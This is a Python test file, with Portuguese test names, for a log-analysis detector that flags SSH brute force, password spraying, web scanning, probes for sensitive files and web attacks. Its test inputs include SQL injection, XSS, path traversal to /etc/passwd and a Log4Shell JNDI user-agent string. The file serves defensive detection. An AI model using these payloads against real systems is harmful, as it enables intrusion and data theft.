from datetime import datetime, timedelta

from log_sentinel.detectors import (
    Thresholds,
    densest_window,
    run_web,
    ssh_bruteforce,
    ssh_password_spray,
    ssh_success_after_failures,
    web_attack_signatures,
    web_login_bruteforce,
    web_scanning,
    web_sensitive_files,
)
from log_sentinel.models import SshEvent, WebEvent

T0 = datetime(2026, 11, 7, 3, 0, 0)
TH = Thresholds()


def failed(sec, user="root", ip="203.0.113.45"):
    return SshEvent(T0 + timedelta(seconds=sec), "failed", user, ip, "password")


def accepted(sec, user="deploy", ip="203.0.113.99"):
    return SshEvent(T0 + timedelta(seconds=sec), "accepted", user, ip, "password")


def web(sec, path="/", status=200, ip="198.51.100.77", method="GET", ua="Mozilla/5.0"):
    return WebEvent(T0 + timedelta(seconds=sec), ip, method, path, status, 100, "-", ua)


def test_densest_window():
    ts = [T0 + timedelta(seconds=s) for s in (0, 10, 20, 500, 505, 510, 515, 900)]
    lo, hi = densest_window(ts, lambda t: t, timedelta(seconds=30))
    assert (lo, hi) == (3, 6)


def test_bruteforce_no_limiar():
    assert ssh_bruteforce([failed(i * 10) for i in range(4)], TH) == []
    found = ssh_bruteforce([failed(i * 10) for i in range(5)], TH)
    assert len(found) == 1 and found[0].count == 5 and found[0].severity == "medium"


def test_bruteforce_espalhado_fora_da_janela_nao_conta():
    # 5 falhas, mas uma a cada 15 minutos
    assert ssh_bruteforce([failed(i * 900) for i in range(5)], TH) == []


def test_bruteforce_severidade_sobe_com_volume():
    found = ssh_bruteforce([failed(i * 5) for i in range(25)], TH)
    assert found[0].severity == "high"


def test_bruteforce_separa_por_ip():
    events = [failed(i, ip="1.1.1.1") for i in range(3)] + [failed(i, ip="2.2.2.2") for i in range(3)]
    assert ssh_bruteforce(events, TH) == []


def test_spray_detecta_muitos_usuarios_com_poucas_tentativas():
    users = [f"user{i}" for i in range(10)]
    events = [failed(i * 20, user=u) for i, u in enumerate(users * 2)]
    found = ssh_password_spray(events, TH)
    assert len(found) == 1 and found[0].mitre == "T1110.003"


def test_dicionario_com_poucos_usuarios_nao_e_spray():
    users = ["root", "admin", "ubuntu", "test", "oracle"]
    events = [failed(i * 5, user=users[i % 5]) for i in range(60)]
    assert ssh_password_spray(events, TH) == []
    assert len(ssh_bruteforce(events, TH)) == 1  # mas é força bruta


def test_sucesso_apos_falhas_e_critico():
    events = [failed(i * 5, user="deploy", ip="203.0.113.99") for i in range(6)] + [accepted(40)]
    found = ssh_success_after_failures(events, TH)
    assert len(found) == 1 and found[0].severity == "critical" and "deploy" in found[0].summary


def test_sucesso_sem_falhas_ou_com_poucas_nao_alerta():
    assert ssh_success_after_failures([accepted(10)], TH) == []
    events = [failed(i, ip="203.0.113.99") for i in range(3)] + [accepted(10)]
    assert ssh_success_after_failures(events, TH) == []


def test_sucesso_nao_olha_falhas_de_outro_ip():
    events = [failed(i, ip="9.9.9.9") for i in range(10)] + [accepted(20, ip="203.0.113.99")]
    assert ssh_success_after_failures(events, TH) == []


def test_falhas_depois_do_sucesso_nao_contam():
    events = [accepted(0)] + [failed(10 + i, ip="203.0.113.99") for i in range(10)]
    assert ssh_success_after_failures(events, TH) == []


def test_varredura_por_404():
    events = [web(i, f"/x{i}", 404) for i in range(15)]
    assert len(web_scanning(events, TH)) == 1
    assert web_scanning(events[:14], TH) == []


def test_arquivo_sensivel_recusado_vs_exposto():
    recusado = web_sensitive_files([web(0, "/.env", 404)], TH)
    assert recusado[0].severity == "medium"

    exposto = web_sensitive_files([web(0, "/.env", 200)], TH)
    assert exposto[0].severity == "critical" and "COM SUCESSO" in exposto[0].summary


def test_arquivo_sensivel_ignora_query_e_pega_codificado():
    assert web_sensitive_files([web(0, "/index?next=/.env", 200)], TH) == []
    assert len(web_sensitive_files([web(0, "/%2e%65nv", 404)], TH)) == 1  # %2e%65nv decodifica para .env
    assert web_sensitive_files([web(0, "/.git/config", 404)], TH)[0].count == 1


def test_assinaturas_de_ataque_inclusive_duplo_encode():
    cases = {
        "/p?id=1%27%20OR%201%3D1--": "sql-injection",
        "/p?id=1%2520UNION%2520SELECT%2520password%2520FROM%2520users": "sql-injection",
        "/p?q=%3Cscript%3Ealert(1)%3C/script%3E": "xss",
        "/dl?f=../../../../etc/passwd": "path-traversal",
    }
    for path, kind in cases.items():
        found = web_attack_signatures([web(0, path)], TH)
        assert found and kind in found[0].summary, path


def test_log4shell_no_user_agent():
    found = web_attack_signatures([web(0, "/", ua="${jndi:ldap://203.0.113.9/a}")], TH)
    assert found and "log4shell" in found[0].summary


def test_trafego_normal_nao_gera_achado():
    normal = [web(i * 60, p, 200, ip=f"192.0.2.{i % 20}") for i, p in enumerate(["/", "/produtos", "/produtos/42", "/css/app.css"] * 10)]
    normal += [web(5000, "/produtos/velho", 404, ip="192.0.2.5")]
    normal += [web(6000, "/search?q=select+a+shoe", 200)]
    assert run_web(normal, TH) == []


def test_login_brute_force_so_conta_post_recusado():
    posts = [web(i * 2, "/login", 401, method="POST", ip="192.0.2.55") for i in range(10)]
    assert len(web_login_bruteforce(posts, TH)) == 1
    gets = [web(i * 2, "/login", 401, method="GET", ip="192.0.2.55") for i in range(10)]
    assert web_login_bruteforce(gets, TH) == []
    ok = [web(i * 2, "/login", 302, method="POST", ip="192.0.2.55") for i in range(10)]
    assert web_login_bruteforce(ok, TH) == []
